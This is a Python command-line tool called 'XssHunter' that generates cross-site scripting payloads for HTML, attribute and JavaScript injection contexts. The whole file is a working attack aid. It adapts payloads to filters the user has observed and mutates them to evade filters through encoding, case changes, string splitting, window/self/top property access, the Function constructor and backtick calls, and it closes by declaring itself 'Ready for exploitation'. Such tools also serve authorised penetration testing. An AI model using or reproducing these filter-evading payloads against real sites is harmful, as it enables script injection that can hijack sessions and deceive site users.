import os

print("="*80)
print("🔥 XssHunter - Advanced XSS Exploitation Engine")
print("👨‍💻 Made by: Syed Shahwar Ahmed")
print("="*80)

# ---------------- CONTEXT ----------------
print("\n🎯 Injection Context:\n")
print("1. HTML")
print("2. Attribute")
print("3. JavaScript")
print("4. Unknown")

context = input("\nSelect context (1-4): ")

# ---------------- FILTER QUESTIONS ----------------
print("\n🧠 Observed Filters:\n")

filters = []

questions = {
    "script": "Is <script> blocked? (y/n): ",
    "alert": "Is alert() blocked? (y/n): ",
    "angle": "Are < > filtered? (y/n): ",
    "quote": "Are quotes filtered? (y/n): ",
    "event": "Are event handlers blocked? (y/n): ",
    "space": "Is space filtered? (y/n): ",
    "jsproto": "Is javascript: blocked? (y/n): "
}

for key, q in questions.items():
    if input(q).lower() == "y":
        filters.append(key)

# ---------------- BASE PAYLOADS ----------------
payloads = []

if context == "1":  # HTML
    payloads += [
        '<svg onload=alert(1)>',
        '<img src=x onerror=alert(1)>'
    ]

elif context == "2":  # ATTRIBUTE
    payloads += [
        '" onmouseover=alert(1) x="',
        "' onmouseover=alert(1) x='",
        'javascript:alert(1)'
    ]

elif context == "3":  # JS
    payloads += [
        '";alert(1);//',
        "';alert(1);//",
        '`;alert(1);//'
    ]

else:  # UNKNOWN
    payloads += [
        '<svg onload=alert(1)>',
        '" onmouseover=alert(1) x="',
        '";alert(1);//'
    ]

# ---------------- FILTER ADAPTATION ----------------
adapted = []

for p in payloads:
    new_p = p

    if "alert" in filters:
        new_p = new_p.replace("alert", "confirm")

    if "space" in filters:
        new_p = new_p.replace(" ", "/")

    adapted.append(new_p)

# ---------------- MUTATION ENGINE ----------------
def mutate(payload):
    mutations = []

    # Encoding
    mutations.append(payload.replace("<", "%3C").replace(">", "%3E"))

    # Case variation
    mutations.append(payload.upper())

    # Whitespace bypass
    mutations.append(payload.replace(" ", "%0A"))

    if "alert" in payload:
        # Basic split
        mutations.append(payload.replace("alert", 'al"+"ert'))

        # Object access
        mutations.append(payload.replace("alert", 'this["alert"]'))

        # Advanced bypasses
        mutations.append(payload.replace("alert", "window['alert']"))
        mutations.append(payload.replace("alert", "top['alert']"))
        mutations.append(payload.replace("alert", "self['alert']"))

        # Function constructor
        mutations.append(payload.replace("alert(1)", "Function('alert(1)')()"))

        # Backtick
        mutations.append(payload.replace("alert(1)", "alert`1`"))

    return mutations

# ---------------- GENERATE ----------------
final_payloads = []

for p in adapted:
    final_payloads.append(p)
    final_payloads.extend(mutate(p))

# ---------------- CUSTOM PAYLOAD LOADER ----------------
print("\n📂 Do you want to add your own payload list?")
choice = input("(y/n): ")

if choice.lower() == "y":
    path = input("Enter full file path: ")

    if os.path.exists(path):
        print("\n[+] Loading your payloads...\n")

        with open(path, "r") as f:
            custom_payloads = [line.strip() for line in f.readlines()]

        for cp in custom_payloads:
            final_payloads.append(cp)
            final_payloads.extend(mutate(cp))

    else:
        print("[!] File not found")

# ---------------- OUTPUT ----------------
print("\n🚀 Final Payload List:\n")

for p in set(final_payloads):
    print(p)

print("\n✅ XssHunter Completed - Ready for exploitation 🔥")